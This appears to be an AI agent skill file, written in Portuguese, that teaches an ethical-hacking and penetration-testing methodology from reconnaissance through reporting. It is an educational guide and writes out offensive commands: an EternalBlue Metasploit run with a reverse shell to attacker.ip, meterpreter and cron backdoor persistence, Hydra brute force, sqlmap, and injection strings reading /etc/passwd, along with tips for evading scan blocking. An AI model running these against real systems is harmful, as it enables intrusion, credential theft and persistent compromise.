---
name: Ethical Hacking Methodology
description: Esta skill deve ser usada quando o usuário solicitar "aprender hacking ético", "entender ciclo de vida do teste de penetração", "realizar reconhecimento", "conduzir varredura de segurança", "explorar vulnerabilidades" ou "escrever relatórios de teste de penetração". Fornece metodologia abrangente de hacking ético e técnicas.
metadata:
  author: zebbern
  version: "1.1"
---

# Ethical Hacking Methodology

## Propósito

Domine o ciclo de vida completo do teste de penetração, da reconhecimento até relatório. Esta skill cobre os cinco estágios da metodologia de hacking ético, ferramentas essenciais, técnicas de ataque e relatório profissional para avaliações de segurança autorizadas.

## Pré-requisitos

### Ambiente Necessário
- Kali Linux instalado (persistente ou live)
- Acesso de rede aos alvo autorizados
- Autorização escrita do proprietário do sistema

### Conhecimento Necessário
- Conceitos básicos de redes
- Proficiência em linha de comando Linux
- Compreensão de tecnologias web
- Familiaridade com conceitos de segurança

## Saídas e Entregas

1. **Relatório de Reconhecimento** - Informações do alvo coletadas
2. **Avaliação de Vulnerabilidade** - Fraquezas identificadas
3. **Evidência de Exploração** - Ataques de prova de conceito
4. **Relatório Final** - Conclusões executivas e técnicas

## Fluxo de Trabalho Principal

### Fase 1: Entendendo Tipos de Hackers

Classificação de profissionais de segurança:

**Hackers White Hat (Hackers Éticos)**
- Profissionais de segurança autorizados
- Realizam testes de penetração com permissão
- Objetivo: Identificar e corrigir vulnerabilidades
- Também conhecido como: penetration testers, consultores de segurança

**Hackers Black Hat (Maliciosos)**
- Intrusões não autorizadas em sistemas
- Motivados por lucro, vingança ou notoriedade
- Objetivo: Roubar dados, causar danos
- Também conhecido como: crackers, hackers criminosos

**Hackers Grey Hat (Híbrido)**
- Podem cruzar limites éticos
- Não são maliciosos mas podem quebrar regras
- Frequentemente divulgam vulnerabilidades publicamente
- Motivações mistas

**Outras Classificações**
- **Script Kiddies**: Usam ferramentas pré-feitas sem compreensão
- **Hacktivistas**: Motivados politicamente ou socialmente
- **Nation State**: Operadores patrocinados por governos
- **Coders**: Desenvolvem ferramentas e exploits

### Fase 2: Reconhecimento

Colete informações sem interação direta com o sistema:

**Reconhecimento Passivo**
```bash
# Busca WHOIS
whois target.com

# Enumeração DNS
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# Descoberta de subdomínios
dnsrecon -d target.com

# Extração de emails
theHarvester -d target.com -b all
```

**Google Hacking (OSINT)**
```
# Encontre arquivos expostos
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# Encontre páginas de login
site:target.com inurl:login
site:target.com inurl:admin

# Encontre listagens de diretórios
site:target.com intitle:"index of"

# Encontre arquivos de configuração
site:target.com filetype:config
site:target.com filetype:env
```

**Categorias do Google Hacking Database:**
- Arquivos contendo senhas
- Diretórios sensíveis
- Detecção de servidor web
- Servidores vulneráveis
- Mensagens de erro
- Portais de login

**Reconhecimento em Redes Sociais**
- LinkedIn: Organogramas, tecnologias usadas
- Twitter: Anúncios da empresa, informações de funcionários
- Facebook: Informações pessoais, relacionamentos
- Vagas de emprego: Revelações da pilha de tecnologia

### Fase 3: Varredura

Enumeração ativa de sistemas alvo:

**Descoberta de Hosts**
```bash
# Varredura de ping
nmap -sn 192.168.1.0/24

# Varredura ARP (rede local)
arp-scan -l

# Descubra hosts ativos
nmap -sP 192.168.1.0/24
```

**Varredura de Portas**
```bash
# Varredura TCP SYN (furtiva)
nmap -sS target.com

# Varredura TCP completa
nmap -sT target.com

# Varredura UDP
nmap -sU target.com

# Varredura de todas as portas
nmap -p- target.com

# Top 1000 portas com detecção de serviço
nmap -sV target.com

# Varredura agressiva (SO, versão, scripts)
nmap -A target.com
```

**Enumeração de Serviços**
```bash
# Scripts de serviço específicos
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com

# Varredura de vulnerabilidades
nmap --script=vuln target.com
```

**Referência de Portas Comuns**
| Porta | Serviço | Notas |
|-------|---------|-------|
| 21 | FTP | Transferência de arquivos |
| 22 | SSH | Shell seguro |
| 23 | Telnet | Acesso remoto não criptografado |
| 25 | SMTP | Email |
| 53 | DNS | Resolução de nomes |
| 80 | HTTP | Web |
| 443 | HTTPS | Web seguro |
| 445 | SMB | Compartilhamentos Windows |
| 3306 | MySQL | Banco de dados |
| 3389 | RDP | Desktop remoto |

### Fase 4: Análise de Vulnerabilidade

Identifique fraquezas exploráveis:

**Varredura Automatizada**
```bash
# Scanner web Nikto
nikto -h http://target.com

# OpenVAS (linha de comando)
omp -u admin -w password --xml="<get_tasks/>"

# Nessus (via API)
nessuscli scan --target target.com
```

**Testes de Aplicações Web (OWASP)**
- SQL Injection
- Cross-Site Scripting (XSS)
- Broken Authentication
- Security Misconfiguration
- Sensitive Data Exposure
- XML External Entities (XXE)
- Broken Access Control
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging & Monitoring

**Técnicas Manuais**
```bash
# Força bruta de diretórios
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Enumeração de subdomínios
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Fingerprinting de tecnologia web
whatweb target.com
```

### Fase 5: Exploração

Explore ativamente as vulnerabilidades descobertas:

**Metasploit Framework**
```bash
# Inicie o Metasploit
msfconsole

# Procure por exploits
msf> search type:exploit name:smb

# Use exploit específico
msf> use exploit/windows/smb/ms17_010_eternalblue

# Defina o alvo
msf> set RHOSTS target.com

# Defina o payload
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip

# Execute
msf> exploit
```

**Ataques de Senha**
```bash
# Hydra força bruta
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Exploração Web**
```bash
# SQLMap para SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# Teste de XSS
# Manual: <script>alert('XSS')</script>

# Teste de command injection
# ; ls -la
# | cat /etc/passwd
```

### Fase 6: Mantendo Acesso

Estabeleça acesso persistente:

**Backdoors**
```bash
# Persistência do Meterpreter
meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip

# Persistência de chave SSH
# Adicione a chave pública do atacante a ~/.ssh/authorized_keys

# Persistência de cron job
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
```

**Escalonamento de Privilégios**
```bash
# Enumeração Linux
linpeas.sh
linux-exploit-suggester.sh

# Enumeração Windows
winpeas.exe
windows-exploit-suggester.py

# Verifique binários SUID (Linux)
find / -perm -4000 2>/dev/null

# Verifique permissões sudo
sudo -l
```

**Apagando Rastros (Contexto Ético)**
- Documente todas as ações realizadas
- Mantenha logs para relatório
- Evite mudanças desnecessárias no sistema
- Limpe arquivos de teste e backdoors

### Fase 7: Relatório

Documente os achados profissionalmente:

**Estrutura do Relatório**
1. **Resumo Executivo**
   - Achados de alto nível
   - Impacto no negócio
   - Classificação de risco
   - Prioridades de remediação

2. **Achados Técnicos**
   - Detalhes da vulnerabilidade
   - Prova de conceito
   - Screenshots/evidências
   - Sistemas afetados

3. **Classificação de Risco**
   - Crítico: Ação imediata necessária
   - Alto: Resolver em 24-48 horas
   - Médio: Resolver em 1 semana
   - Baixo: Resolver em 1 mês
   - Informativo: Recomendações de melhores práticas

4. **Recomendações de Remediação**
   - Correções específicas para cada achado
   - Mitigações de curto prazo
   - Soluções de longo prazo
   - Requisitos de recursos

5. **Apêndices**
   - Saídas detalhadas de varreduras
   - Configurações de ferramentas
   - Linha do tempo de testes
   - Escopo e metodologia

### Fase 8: Tipos de Ataque Comuns

**Phishing**
- Roubo de credenciais baseado em email
- Páginas de login falsas
- Anexos maliciosos
- Componente de engenharia social

**Tipos de Malware**
- **Vírus**: Auto-replicável, precisa de arquivo hospedeiro
- **Worm**: Auto-propagável através de redes
- **Trojan**: Disfarçado como software legítimo
- **Ransomware**: Criptografa arquivos por resgate
- **Rootkit**: Acesso oculto no nível do sistema
- **Spyware**: Monitora atividade do usuário

**Ataques de Rede**
- Man-in-the-Middle (MITM)
- ARP Spoofing
- DNS Poisoning
- DDoS (Distributed Denial of Service)

### Fase 9: Configuração Kali Linux

Instale plataforma de teste de penetração:

**Instalação em Disco Rígido**
1. Baixe ISO de kali.org
2. Inicie de mídia de instalação
3. Selecione "Graphical Install"
4. Configure idioma, localização, teclado
5. Defina nome do host e senha de root
6. Particione disco (Guided - use disco inteiro)
7. Instale bootloader GRUB
8. Reinicie e faça login

**USB Live (Persistente)**
```bash
# Crie USB inicializável
dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress

# Crie partição persistente
gparted /dev/sdb
# Adicione partição ext4 rotulada como "persistence"

# Configure persistência
mkdir /mnt/usb
mount /dev/sdb2 /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### Fase 10: Diretrizes Éticas

**Requisitos Legais**
- Obtenha autorização escrita
- Defina escopo claramente
- Documente todas as atividades de teste
- Reporte todos os achados ao cliente
- Mantenha confidencialidade

**Conduta Profissional**
- Trabalhe com ética e integridade
- Respeite privacidade de dados acessados
- Evite danos desnecessários ao sistema
- Execute apenas testes planejados
- Nunca use achados para ganho pessoal

## Referência Rápida

### Ciclo de Vida do Teste de Penetração

| Estágio | Propósito | Ferramentas Principais |
|---------|-----------|----------------------|
| Reconhecimento | Colete informações | theHarvester, WHOIS, Google |
| Varredura | Enumerate alvos | Nmap, Nikto, Gobuster |
| Exploração | Ganhe acesso | Metasploit, SQLMap, Hydra |
| Mantendo Acesso | Persistência | Meterpreter, chaves SSH |
| Relatório | Documente achados | Modelos de relatório |

### Comandos Essenciais

| Comando | Propósito |
|---------|-----------|
| `nmap -sV target` | Varredura de porta e serviço |
| `nikto -h target` | Varredura de vulnerabilidade web |
| `msfconsole` | Inicie Metasploit |
| `hydra -l user -P list ssh://target` | Força bruta SSH |
| `sqlmap -u "url?id=1" --dbs` | SQL injection |

## Restrições e Limitações

### Autorização Necessária
- Nunca teste sem permissão escrita
- Mantenha-se dentro do escopo definido
- Reporte tentativas de acesso não autorizadas

### Padrões Profissionais
- Siga regras de engajamento
- Mantenha confidencialidade do cliente
- Documente metodologia usada
- Forneça recomendações acionáveis

## Solução de Problemas

### Varreduras Bloqueadas

**Soluções:**
1. Use taxas de varredura mais lentas
2. Tente técnicas de varredura diferentes
3. Use proxy ou VPN
4. Fragmente pacotes

### Exploits Falhando

**Soluções:**
1. Verifique se vulnerabilidade do alvo existe
2. Verifique compatibilidade do payload
3. Ajuste parâmetros do exploit
4. Tente exploits alternativos